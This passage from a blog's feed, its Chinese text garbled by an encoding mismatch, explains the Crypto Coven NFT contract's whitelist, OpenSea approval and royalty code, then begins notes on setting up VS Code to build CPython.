class="number">9</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;birthChart&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;sun&quot;</span><span class="punctuation">:</span> <span class="string">&quot;taurus&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;moon&quot;</span><span class="punctuation">:</span> <span class="string">&quot;aquarius&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;rising&quot;</span><span class="punctuation">:</span> <span class="string">&quot;capricorn&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;styles&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;attribute&quot;</span><span class="punctuation">:</span> <span class="string">&quot;background&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;solid&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sepia&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;fullName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;background_solid_sepia&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;attribute&quot;</span><span class="punctuation">:</span> <span class="string">&quot;base&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;lithe&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dawn&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;fullName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;base_lithe_dawn&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;attribute&quot;</span><span class="punctuation">:</span> <span class="string">&quot;body-under&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sheer-top&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;black&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;fullName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;body-under_sheer-top_black&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;attribute&quot;</span><span class="punctuation">:</span> <span class="string">&quot;eyebrows&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;medium-flat&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;black&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;fullName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;eyebrows_medium-flat_black&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;attribute&quot;</span><span class="punctuation">:</span> <span class="string">&quot;eyes&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;nyx&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cloud&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;fullName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;eyes_nyx_cloud&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;attribute&quot;</span><span class="punctuation">:</span> <span class="string">&quot;mouth&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;nyx&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;mocha&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;fullName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;mouth_nyx_mocha&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;attribute&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hair-back&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;nyx&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;steel&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;fullName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hair-back_nyx_steel&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;attribute&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hair-bangs&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;nyx&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;steel&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;fullName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hair-bangs_nyx_steel&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;attribute&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hat-back&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;witch&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;black&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;fullName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hat-back_witch_black&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;attribute&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hat-front&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;witch&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;black&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;fullName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hat-front_witch_black&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;attribute&quot;</span><span class="punctuation">:</span> <span class="string">&quot;necklace&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;moon-necklace&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;silver&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;fullName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;necklace_moon-necklace_silver&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;hash&quot;</span><span class="punctuation">:</span> <span class="string">&quot;nyx&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­åŒ…å«å¥³å·«çš„IDï¼Œåç§°ï¼Œå›¾ç‰‡åœ°å€ï¼Œå±æ€§ç­‰ä¿¡æ¯ã€‚</p><p>ä¸å¾—ä¸è¯´ï¼Œå¦‚æœ Amazon S3 å‡ºé—®é¢˜äº†ï¼Œå¯èƒ½è¿™äº›å›¾ç‰‡å°±æ²¡æ³•æ˜¾ç¤ºäº†ã€‚</p><h3><span id="shi-yong-merkle-zheng-ming-shi-xian-bai-ming-dan-ji-zhi">ä½¿ç”¨ Merkle è¯æ˜å®ç°ç™½åå•æœºåˆ¶</span></h3><p>å¯¹äºé¢„å”®ï¼Œé¡¹ç›®æ–¹ä½¿ç”¨ç™½åå•æ–¹å¼è¿›è¡Œï¼Œè€Œå¯¹äºç™½åå•éªŒè¯ï¼Œåˆçº¦ä¸­ä½¿ç”¨ Merkle è¯æ˜çš„æ–¹å¼è¿›è¡ŒéªŒè¯ã€‚</p><p>åœ¨ mint æ—¶ï¼Œåªéœ€å‘é€æ­£ç¡®çš„ Merkle è¯æ˜æ¥éªŒè¯å³å¯å®ç°ç™½åå•åŠŸèƒ½ï¼Œè¿™ä¸ªæ–¹æ³•ä¸ä»…æ•ˆç‡é«˜ï¼Œè€Œä¸”çœå»äº†åœ¨åˆçº¦ä¸­å­˜å‚¨æ‰€æœ‰ç™½åå•åœ°å€é€ æˆçš„ Gas æ¶ˆè€—ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    modifier isValidMerkleProof(bytes32[] calldata merkleProof, bytes32 root) &#123;</span><br><span class="line">        require(</span><br><span class="line">            MerkleProof.verify(</span><br><span class="line">                merkleProof,</span><br><span class="line">                root,</span><br><span class="line">                keccak256(abi.encodePacked(msg.sender))</span><br><span class="line">            ),</span><br><span class="line">            &quot;Address does not exist in list&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    function mintCommunitySale(</span><br><span class="line">        uint8 numberOfTokens,</span><br><span class="line">        bytes32[] calldata merkleProof</span><br><span class="line">    )</span><br><span class="line">        external</span><br><span class="line">        payable</span><br><span class="line">        nonReentrant</span><br><span class="line">        communitySaleActive</span><br><span class="line">        canMintWitches(numberOfTokens)</span><br><span class="line">        isCorrectPayment(COMMUNITY_SALE_PRICE, numberOfTokens)</span><br><span class="line">        isValidMerkleProof(merkleProof, communitySaleMerkleRoot)</span><br><span class="line">    &#123;</span><br><span class="line">        // ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function claim(bytes32[] calldata merkleProof)</span><br><span class="line">        external</span><br><span class="line">        isValidMerkleProof(merkleProof, claimListMerkleRoot)</span><br><span class="line">        canGiftWitches(1)</span><br><span class="line">    &#123;</span><br><span class="line">// ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¯¦ç»†ç»†èŠ‚å¯ä»¥å‚è€ƒæˆ‘ä¹‹å‰çš„ä¸€ç¯‡æ–‡ç« ï¼š</p><h3><span id="yu-xian-pi-zhun-opensea-he-yue">é¢„å…ˆæ‰¹å‡† Opensea åˆçº¦</span></h3><p>å¯ä»¥çœ‹åˆ°åœ¨ OpenSea ä¸Šåˆ—å‡ºè¿™äº› NFT è´¹ç”¨ä¸º 0 gasï¼Œå› ä¸ºåˆçº¦é¢„å…ˆæ‰¹å‡†äº† OpenSea åˆçº¦ä»¥èŠ‚çœç”¨æˆ·çš„ gasï¼ŒåŒæ—¶åˆçº¦è¿˜åŒ…æ‹¬ä¸€ä¸ªç´§æ€¥åŠŸèƒ½æ¥æ¶ˆé™¤è¿™ç§è¡Œä¸ºï¼</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    /**</span><br><span class="line">     * @dev Override isApprovedForAll to allowlist user&#x27;s OpenSea proxy accounts to enable gas-less listings.</span><br><span class="line">     */</span><br><span class="line">    function isApprovedForAll(address owner, address operator)</span><br><span class="line">        public</span><br><span class="line">        view</span><br><span class="line">        override</span><br><span class="line">        returns (bool)</span><br><span class="line">    &#123;</span><br><span class="line">        // Get a reference to OpenSea&#x27;s proxy registry contract by instantiating</span><br><span class="line">        // the contract using the already existing address.</span><br><span class="line">        ProxyRegistry proxyRegistry = ProxyRegistry(</span><br><span class="line">            openSeaProxyRegistryAddress</span><br><span class="line">        );</span><br><span class="line">        if (</span><br><span class="line">            isOpenSeaProxyActive &amp;&amp;</span><br><span class="line">            address(proxyRegistry.proxies(owner)) == operator</span><br><span class="line">        ) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return super.isApprovedForAll(owner, operator);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">// These contract definitions are used to create a reference to the OpenSea</span><br><span class="line">// ProxyRegistry contract by using the registry&#x27;s address (see isApprovedForAll).</span><br><span class="line">contract OwnableDelegateProxy &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ProxyRegistry &#123;</span><br><span class="line">    mapping(address =&gt; OwnableDelegateProxy) public proxies;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸ºäº†é˜²æ­¢ Opensea å…³é—­æˆ–è€…è¢«å…¥ä¾µï¼Œåˆçº¦å¯ä»¥é€šè¿‡ <code>setIsOpenSeaProxyActive</code> æ–¹æ³•å…³é—­é¢„å…ˆæ‰¹å‡†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// function to disable gasless listings for security in case</span><br><span class="line">// opensea ever shuts down or is compromised</span><br><span class="line">function setIsOpenSeaProxyActive(bool _isOpenSeaProxyActive)</span><br><span class="line">    external</span><br><span class="line">    onlyOwner</span><br><span class="line">&#123;</span><br><span class="line">    isOpenSeaProxyActive = _isOpenSeaProxyActive;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="erc165">ERC165</span></h3><p>è¿™æ˜¯ä¸€ç§å‘å¸ƒå¹¶èƒ½æ£€æµ‹åˆ°ä¸€ä¸ªæ™ºèƒ½åˆçº¦å®ç°äº†ä»€ä¹ˆæ¥å£çš„æ ‡å‡†ï¼Œç”¨äºå®ç°å¯¹åˆçº¦å®ç°çš„æ¥å£çš„æŸ¥è¯¢ã€‚è¿™ä¸ªæ ‡å‡†éœ€è¦å®ç° <code>suppoetsInterface</code> æ–¹æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">interface ERC165 &#123;</span><br><span class="line">    /// @notice Query if a contract implements an interface</span><br><span class="line">    /// @param interfaceID The interface identifier, as specified in ERC-165</span><br><span class="line">    /// @dev Interface identification is specified in ERC-165. This function</span><br><span class="line">    ///  uses less than 30,000 gas.</span><br><span class="line">    /// @return `true` if the contract implements `interfaceID` and</span><br><span class="line">    ///  `interfaceID` is not 0xffffffff, `false` otherwise</span><br><span class="line">    function supportsInterface(bytes4 interfaceID) external view returns (bool);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŠ å¯†å¥³å·«å®ç°å¤å†™è¿™ä¸ªæ–¹æ³•æ˜¯å› ä¸ºå®ƒé¢å¤–å®ç°äº† EIP2981 è¿™ä¸ªæ ‡å‡†ï¼Œéœ€è¦æŒ‡å‡ºã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function supportsInterface(bytes4 interfaceId)</span><br><span class="line">    public</span><br><span class="line">    view</span><br><span class="line">    virtual</span><br><span class="line">    override(ERC721, IERC165)</span><br><span class="line">    returns (bool)</span><br><span class="line">&#123;</span><br><span class="line">    return</span><br><span class="line">        interfaceId == type(IERC2981).interfaceId ||</span><br><span class="line">        super.supportsInterface(interfaceId);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="eip2981-nft-ban-shui-biao-zhun">EIP2981ï¼šNFT ç‰ˆç¨æ ‡å‡†</span></h3><p>EIP-2981 å®ç°äº†æ ‡å‡†åŒ–çš„ç‰ˆç¨ä¿¡æ¯æ£€ç´¢ï¼Œå¯è¢«ä»»ä½•ç±»å‹çš„ NFT å¸‚åœºæ¥å—ã€‚EIP-2981 æ”¯æŒæ‰€æœ‰å¸‚åœºæ£€ç´¢ç‰¹å®š NFT çš„ç‰ˆç¨æ”¯ä»˜ä¿¡æ¯ï¼Œä»è€Œå®ç°æ— è®º NFT åœ¨å“ªä¸ªå¸‚åœºå‡ºå”®æˆ–è½¬å”®éƒ½å¯ä»¥å®ç°å‡†ç¡®çš„ç‰ˆç¨æ”¯ä»˜ã€‚</p><p>NFT å¸‚åœºå’Œä¸ªäººå¯é€šè¿‡æ£€ç´¢ç‰ˆç¨æ”¯ä»˜ä¿¡æ¯ <code>royaltyInfo()</code> æ¥å®æ–½è¯¥æ ‡å‡†ï¼Œå®ƒæŒ‡å®šä¸ºç‰¹å®šçš„ NFT é”€å”®ä»·æ ¼å‘æŒ‡å®šçš„å•ä¸€åœ°å€æ”¯ä»˜ç‰¹å®šæ¯”ä¾‹çš„é‡‘é¢ã€‚å¯¹äºç‰¹å®šçš„ <code>tokenId</code> å’Œ <code>salePrice</code>ï¼Œåœ¨è¯·æ±‚æ—¶éœ€æä¾›ä¸€ä¸ªç‰ˆç¨æ¥æ”¶è€…çš„åœ°å€å’Œè¦æ”¯ä»˜çš„é¢„æœŸç‰ˆç¨é‡‘é¢ï¼ˆ<em>ç™¾åˆ†æ¯”è¡¨ç¤º</em>ï¼‰ã€‚</p><p>å¥³å·«åˆçº¦è§„å®šäº† 5% çš„ç‰ˆç¨ï¼Œä½†æ˜¯è¿™ä¸ªæ ‡å‡†å¹¶ä¸æ˜¯å¼ºåˆ¶æ€§çš„ï¼Œéœ€è¦é å¸‚åœºå»å®æ–½æ­¤æ ‡å‡†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @dev See &#123;IERC165-royaltyInfo&#125;.</span><br><span class="line"> */</span><br><span class="line">function royaltyInfo(uint256 tokenId, uint256 salePrice)</span><br><span class="line">    external</span><br><span class="line">    view</span><br><span class="line">    override</span><br><span class="line">    returns (address receiver, uint256 royaltyAmount)</span><br><span class="line">&#123;</span><br><span class="line">    require(_exists(tokenId), &quot;Nonexistent token&quot;);</span><br><span class="line"></span><br><span class="line">    return (address(this), SafeMath.div(SafeMath.mul(salePrice, 5), 100));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸å¤ªç¡®å®šæ­¤å‡½æ•°ä¸­çš„æ³¨é‡Š <code>See &#123;IERC165-royaltyInfo&#125;.</code> æ˜¯å¦æ­£ç¡®ï¼Œéœ€è¦ç¡®è®¤ã€‚</p><h3><span id="qi-ta-xi-jie">å…¶ä»–ç»†èŠ‚</span></h3><ol><li><p>æ²¡æœ‰ <code>tokensOfOwner</code> æ–¹æ³•</p><p>å¯èƒ½æ˜¯åŸºäºå¥³å·«NFTçš„å…·ä½“åœºæ™¯ä¸ä¼˜åŒ– Gas åšçš„æƒè¡¡ï¼ŒæŸ¥è¯¢ token æ‰€æœ‰è€…çš„åŠŸèƒ½éœ€è¦é  Opensea çš„ API æˆ–è€… The Graph å»å®ç°ã€‚</p></li></ol><ol start="2"><li><p>åœ¨æ²¡æœ‰å¤–éƒ¨è°ƒç”¨çš„å‡½æ•°ä¸­ä¹ŸåŠ äº† <code>nonReentrant</code></p></li><li><p><code>msg.sender</code> å¯èƒ½æ˜¯åˆçº¦</p></li><li><p>å¯¹ <code>onlyOwner</code> ä¹ŸåŠ äº† <code>nonReentrant</code>ï¼Œé¿å…å¯èƒ½çš„è¢«åˆ©ç”¨ã€‚</p></li></ol><h3><span id="can-kao">å‚è€ƒ</span></h3><ol><li><strong><a href="https://mp.weixin.qq.com/s/DVUYmHLJE75GJ2ATdtYhEw">ä¸ºä»€ä¹ˆè¯´ EIP-2981 çš„ç”Ÿæ•ˆå¯¹äº NFT åˆ›ä½œè€…æ¥è¯´è‡³å…³é‡è¦ï¼Ÿ</a></strong></li></ol><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      Crypto Coven åŠ å¯†å¥³å·« NFT åˆçº¦è§£è¯»
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="åŒºå—é“¾" scheme="https://qiwihui.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>CPython Internals ç¬”è®° â”€â”€ ä»‹ç»ã€å¼€å‘ç¯å¢ƒè®¾ç½®</title>
    <link href="https://qiwihui.com/qiwihui-blog-148/"/>
    <id>https://qiwihui.com/qiwihui-blog-148/</id>
    <published>2024-05-15T02:25:31.363Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="jie-shao">ä»‹ç»</span></h1><p>è¿™æœ¬ä¹¦å°†æ¶µç›– CPython å†…éƒ¨å®ç°çš„ä¸»è¦æ¦‚å¿µï¼Œå¹¶å­¦ä¹ å¦‚ä½•ï¼š</p><ul><li>é˜…è¯»å’Œæµè§ˆæºä»£ç </li><li>ä»æºä»£ç ç¼–è¯‘ CPython</li><li>æ›´æ”¹ Python è¯­æ³•å¹¶å°†å…¶ç¼–è¯‘åˆ°ä½ çš„ CPython ç‰ˆæœ¬ä¸­</li><li>å¯¼èˆªå¹¶ç†è§£è¯¸å¦‚åˆ—è¡¨ã€å­—å…¸å’Œç”Ÿæˆå™¨çš„æ¦‚å¿µçš„å†…éƒ¨å·¥ä½œåŸç†</li><li>æŒæ¡ CPython çš„å†…å­˜ç®¡ç†èƒ½åŠ›</li><li>ä½¿ç”¨å¹¶è¡Œå’Œå¹¶å‘æ‰©å±•ä½ çš„ Python ä»£ç </li><li>ä½¿ç”¨æ–°åŠŸèƒ½ä¿®æ”¹æ ¸å¿ƒç±»å‹</li><li>è¿è¡Œæµ‹è¯•å¥—ä»¶</li><li>åˆ†æå’ŒåŸºå‡†æµ‹è¯• Python ä»£ç å’Œè¿è¡Œæ—¶çš„æ€§èƒ½</li><li>åƒä¸“å®¶ä¸€æ ·è°ƒè¯• C å’Œ Python ä»£ç </li><li>ä¿®æ”¹æˆ–å‡çº§ CPython åº“çš„ç»„ä»¶å¹¶å°†å®ƒä»¬è´¡çŒ®ç»™æœªæ¥çš„ç‰ˆæœ¬</li></ul><span id="more"></span><h2><span id="zai-xian-zi-yuan">åœ¨çº¿èµ„æº</span></h2><p><a href="https://realpython.com/cpython-internals/resources/">CPython Internals resources</a></p><h2><span id="dai-ma-xie-yi">ä»£ç åè®®</span></h2><p>éµå¾ª <a href="https://creativecommons.org/publicdomain/zero/1.0/">Creative Commons Public Domain (CC0) License</a>ã€‚</p><blockquote><p>è¿™ä¹¦ä¸­çš„ä»£ç å·²ç»åœ¨ Windows 10ã€macOS 10.15 å’Œ Linux ä¸Šä½¿ç”¨ Python 3.9.0b1 è¿›è¡Œäº†æµ‹è¯•ã€‚</p></blockquote><h1><span id="she-zhi-kai-fa-huan-jing">è®¾ç½®å¼€å‘ç¯å¢ƒ</span></h1><p>CPython æºä»£ç å¤§çº¦ 65% æ˜¯ Pythonï¼ˆæµ‹è¯•æ˜¯é‡è¦çš„éƒ¨åˆ†ï¼‰ã€24% Cï¼Œå…¶ä½™æ˜¯å…¶ä»–è¯­è¨€çš„æ··åˆã€‚</p><h2><span id="she-zhi-visual-studio-code">è®¾ç½® Visual Studio Code</span></h2><p>ä» <a href="https://code.visualstudio.com/">code.visualstudio.com</a> ä¸‹è½½ Visual Studio Codeï¼Œå¹¶åœ¨æœ¬åœ°å®‰è£…ã€‚</p><p>æ¨èçš„æ‰©å±•ï¼š</p><ul><li><a href="https://github.com/Microsoft/vscode-cpptools">C/C++(ms-vscode.cpptools)</a> æä¾›å¯¹ C/C++ çš„æ”¯æŒï¼ŒåŒ…æ‹¬ IntelliSenseã€è°ƒè¯•å’Œä»£ç é«˜äº®ã€‚</li><li><a href="https://github.com/Microsoft/vscode-python">Python(ms-python.python)</a> ä¸ºç¼–è¾‘ã€è°ƒè¯•å’Œé˜…è¯» Python ä»£ç æä¾›ä¸°å¯Œçš„ Python æ”¯æŒã€‚</li><li><a href="https://github.com/vscode-restructuredtext/vscode-restructuredtext">Restructured Text (lextudio.restructuredtext)</a>  ä¸º reStructuredTextï¼ˆCPython æ–‡æ¡£ä¸­ä½¿ç”¨çš„æ ¼å¼ï¼‰æä¾›ä¸°å¯Œçš„æ”¯æŒã€‚</li><li><a href="https://github.com/spmeesseman/vscode-taskexplorer">Task Explorer (spmeesseman.vscode-taskexplorer)</a> åœ¨èµ„æºç®¡ç†å™¨é€‰é¡¹å¡å†…æ·»åŠ â€œä»»åŠ¡èµ„æºç®¡ç†å™¨â€é¢æ¿ï¼Œå¯ä»¥æ›´å®¹æ˜“å¯åŠ¨ make ä»»åŠ¡ã€‚</li></ul><h3><span id="pei-zhi-ren-wu-he-qi-dong-wen-jian">é…ç½®ä»»åŠ¡å’Œå¯åŠ¨æ–‡ä»¶</span></h3><p>VS Code åœ¨å·¥ä½œåŒºç›®å½•ä¸­åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ <code>.vscode</code>ã€‚ åœ¨æ­¤æ–‡ä»¶å¤¹ä¸­ï¼Œä½ å¯ä»¥åˆ›å»ºï¼š</p><ul><li><code>tasks.json</code> ç”¨äºæ‰§è¡Œé¡¹ç›®å‘½ä»¤çš„å¿«æ·æ–¹å¼</li><li><code>launch.json</code> ç”¨äºé…ç½®è°ƒè¯•å™¨</li><li>å…¶ä»–ç‰¹å®šäºæ’ä»¶çš„æ–‡ä»¶</li></ul><p>åœ¨ <code>.vscode</code> ç›®å½•ä¸­åˆ›å»ºä¸€ä¸ª <code>tasks.json</code> æ–‡ä»¶ï¼Œå¹¶æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼š</p><p><code>cpython-book-samples/11/tasks.json</code>ï¼š</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;tasks&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;label&quot;</span><span class="punctuation">:</span> <span class="string">&quot;build&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;shell&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;group&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;kind&quot;</span><span class="punctuation">:</span> <span class="string">&quot;build&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;isDefault&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;windows&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;PCBuild\build.bat&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;-p x64 -c Debug&quot;</span><span class="punctuation">]</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;linux&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;make -j2 -s&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;osx&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;make -j2 -s&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ä»»åŠ¡èµ„æºç®¡ç†å™¨æ’ä»¶ï¼Œä½ å°†åœ¨ vscode ç»„ä¸­çœ‹åˆ°ä½ é…ç½®çš„ä»»åŠ¡åˆ—è¡¨ã€‚</p><blockquote><p>GitHub repo: <a 